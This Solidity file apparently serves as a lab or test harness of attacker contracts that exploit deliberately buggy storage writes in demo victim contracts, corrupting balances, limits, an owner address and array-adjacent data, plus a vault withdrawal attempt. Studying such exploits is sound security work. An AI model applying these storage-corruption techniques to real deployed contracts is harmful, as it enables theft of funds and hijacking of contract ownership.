// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./Semantic_Level_Bug_Victim.sol";

/**
 * @title OpcodeExploiter
 * @notice Exploits semantic opcode bugs in SemanticOpcodeBugDemo
 */
contract OpcodeExploiter {
    SemanticOpcodeBugDemo public target;
    address public owner;
    
    event AttackInitiated(string step);
    event StorageCorrupted(string variable, uint256 value);
    event ExploitSuccessful(uint256 corruptedBalance);
    
    constructor(address _target) {
        target = SemanticOpcodeBugDemo(_target);
        owner = msg.sender;
    }
    
    // ATTACK: Trigger the setLimitBad function to corrupt balance
    function exploitWrongSlot(uint256 maliciousValue) external {
        require(msg.sender == owner, "not owner");
        
        emit AttackInitiated("Triggering setLimitBad with malicious value");
        
        uint256 balanceBefore = target.balance();
        uint256 limitBefore = target.getLimit();
        
        // This will write maliciousValue to slot 2 (balance) instead of slot 1 (config)
        target.setLimitBad(maliciousValue);
        
        uint256 balanceAfter = target.balance();
        uint256 limitAfter = target.getLimit();
        
        emit StorageCorrupted("balance", balanceAfter);
        emit StorageCorrupted("limit", limitAfter);
        
        // Limit unchanged (still reading from correct slot 1)
        // But balance corrupted (overwritten at slot 2)
        if (balanceAfter != balanceBefore) {
            emit ExploitSuccessful(balanceAfter);
        }
    }
    
    function demonstrateCorruption() external view returns (
        uint256 currentBalance,
        uint256 currentLimit,
        uint256 currentConfig,
        bool isCorrupted
    ) {
        currentBalance = target.balance();
        currentLimit = target.getLimit();
        currentConfig = target.config();
        
        // If balance is suspiciously small, it's been corrupted
        isCorrupted = currentBalance < 100 ether;
    }
}

/**
 * @title VaultStorageAttacker
 * @notice Exploits wrong slot writes in WrongSlotVault
 */
contract VaultStorageAttacker {
    WrongSlotVault public vault;
    address public owner;
    
    event AttackStep(string description, uint256 value);
    event LimitCorrupted(uint256 oldLimit, uint256 newLimit);
    event EmergencyModeCorrupted(bool mode, uint256 limitValue);
    
    constructor(address payable _vault) {
        vault = WrongSlotVault(_vault);
        owner = msg.sender;
    }
    
    // ATTACK STEP 1: Deposit to vault
    function depositToVault() external payable {
        require(msg.sender == owner, "not owner");
        vault.deposit{value: msg.value}();
        emit AttackStep("Deposited to vault", msg.value);
    }
    
    // ATTACK STEP 2: Trigger setWithdrawalLimitBad to corrupt storage
    function corruptWithdrawalLimit() external {
        require(msg.sender == owner, "not owner");
        
        uint256 oldLimit = vault.withdrawalLimit();
        
        // This will write to wrong slot due to incorrect keccak calculation
        vault.setWithdrawalLimitBad(999999 ether);
        
        uint256 newLimit = vault.withdrawalLimit();
        
        emit LimitCorrupted(oldLimit, newLimit);
        emit AttackStep("Triggered setWithdrawalLimitBad", newLimit);
    }
    
    // ATTACK STEP 3: Trigger setEmergencyModeBad to overwrite withdrawalLimit
    function corruptEmergencyMode(bool mode) external {
        require(msg.sender == owner, "not owner");
        
        uint256 limitBefore = vault.withdrawalLimit();
        
        // This will overwrite withdrawalLimit (slot 2) instead of emergencyMode (slot 3)
        vault.setEmergencyModeBad(mode);
        
        uint256 limitAfter = vault.withdrawalLimit();
        
        emit EmergencyModeCorrupted(mode, limitAfter);
        emit AttackStep("Triggered setEmergencyModeBad", limitAfter);
    }
    
    // ATTACK STEP 4: Exploit corrupted state to withdraw
    function exploitCorruptedState() external {
        require(msg.sender == owner, "not owner");
        
        uint256 myDeposit = vault.deposits(address(this));
        
        if (myDeposit > 0) {
            // If limits are corrupted, we might be able to withdraw more
            vault.withdraw(myDeposit);
            emit AttackStep("Withdrew from corrupted vault", myDeposit);
        }
    }
    
    receive() external payable {}
}

/**
 * @title PackedStorageExploiter
 * @notice Exploits packed storage bugs to corrupt owner address
 */
contract PackedStorageExploiter {
    PackedStorageBug public target;
    address public owner;
    
    event AttackExecuted(string vulnerability);
    event OwnerCorrupted(address oldOwner, address newOwner);
    event ValuesCorrupted(uint128 value1, uint128 value2);
    
    constructor(address _target) {
        target = PackedStorageBug(_target);
        owner = msg.sender;
    }
    
    // ATTACK: Corrupt owner address by exploiting setValue1Bad
    function corruptOwnerAddress(uint128 maliciousValue) external {
        require(msg.sender == owner, "not owner");
        
        address ownerBefore = target.owner();
        
        // This will corrupt the owner address in slot 0
        target.setValue1Bad(maliciousValue);
        
        address ownerAfter = target.owner();
        
        if (ownerBefore != ownerAfter) {
            emit OwnerCorrupted(ownerBefore, ownerAfter);
            emit AttackExecuted("setValue1Bad corrupted owner address");
        }
    }
    
    // ATTACK: Corrupt value storage with wrong masking
    function corruptValues(uint128 maliciousValue) external {
        require(msg.sender == owner, "not owner");
        
        uint128 value1Before = target.value1();
        uint128 value2Before = target.value2();
        
        // This will corrupt value2 with wrong mask
        target.setValue2Bad(maliciousValue);
        
        uint128 value1After = target.value1();
        uint128 value2After = target.value2();
        
        emit ValuesCorrupted(value1After, value2After);
        emit AttackExecuted("setValue2Bad used wrong mask");
    }
    
    function checkCorruption() external view returns (
        address currentOwner,
        bool ownerCorrupted,
        uint128 value1,
        uint128 value2
    ) {
        currentOwner = target.owner();
        value1 = target.value1();
        value2 = target.value2();
        
        // Check if owner address looks corrupted (invalid address)
        ownerCorrupted = (uint160(currentOwner) < 0x1000);
    }
}

/**
 * @title ArraySlotExploiter
 * @notice Exploits dynamic array slot calculation bugs
 */
contract ArraySlotExploiter {
    DynamicArrayBug public target;
    address public owner;
    
    event AttackStep(string description);
    event CriticalDataCorrupted(uint256 oldValue, uint256 newValue);
    event ArrayManipulated(uint256 index, uint256 value);
    
    constructor(address _target) {
        target = DynamicArrayBug(_target);
        owner = msg.sender;
    }
    
    // ATTACK STEP 1: Add items to array
    function setupArray(uint256 count) external {
        require(msg.sender == owner, "not owner");
        
        for (uint256 i = 0; i < count; i++) {
            target.addItem(i * 100);
        }
        
        emit AttackStep("Added items to array");
    }
    
    // ATTACK STEP 2: Exploit setItemBad to corrupt criticalData
    function corruptCriticalData(uint256 maliciousValue) external {
        require(msg.sender == owner, "not owner");
        
        uint256 criticalBefore = target.criticalData();
        
        // Use index 0 to hit slot 2 (where criticalData is)
        // setItemBad calculates: slot = 2 + 0 = 2 (criticalData slot!)
        target.setItemBad(0, maliciousValue);
        
        uint256 criticalAfter = target.criticalData();
        
        if (criticalBefore != criticalAfter) {
            emit CriticalDataCorrupted(criticalBefore, criticalAfter);
            emit AttackStep("Corrupted criticalData via array slot collision");
        }
    }
    
    function demonstrateCollision() external view returns (
        uint256 criticalData,
        uint256 itemsLength,
        bool isCorrupted
    ) {
        criticalData = target.criticalData();
        itemsLength = target.items(0);
        
        // Critical data should be 999999
        isCorrupted = (criticalData != 999999);
    }
}

/**
 * @title SystemWideCorruptor
 * @notice Demonstrates cascading corruption across all semantic bug contracts
 */
contract SystemWideCorruptor {
    SemanticBugSystem public system;
    address public owner;
    
    event SystemCompromised(string component);
    event CascadingCorruption(uint256 step, string description);
    event FinalState(bool systemHealthy, uint256 corruptionCount);
    
    constructor(address _system) {
        system = SemanticBugSystem(_system);
        owner = msg.sender;
    }
    
    // ATTACK: Corrupt all system components
    function corruptEntireSystem() external {
        require(msg.sender == owner, "not owner");
        
        // Step 1: Corrupt opcode contract
        SemanticOpcodeBugDemo opcodeContract = system.opcodeContract();
        opcodeContract.setLimitBad(12345);
        emit CascadingCorruption(1, "Corrupted opcode contract balance");
        emit SystemCompromised("SemanticOpcodeBugDemo");
        
        // Step 2: Check system health
        system.checkSystemHealth();
        
        bool healthy = system.systemHealthy();
        uint256 corruptionCount = system.corruptionCount();
        
        emit FinalState(healthy, corruptionCount);
    }
    
    function analyzeSystemState() external view returns (
        bool systemHealthy,
        uint256 corruptionCount,
        uint256 opcodeBalance,
        uint256 opcodeLimit
    ) {
        systemHealthy = system.systemHealthy();
        corruptionCount = system.corruptionCount();
        
        SemanticOpcodeBugDemo opcodeContract = system.opcodeContract();
        opcodeBalance = opcodeContract.balance();
        opcodeLimit = opcodeContract.getLimit();
    }
}
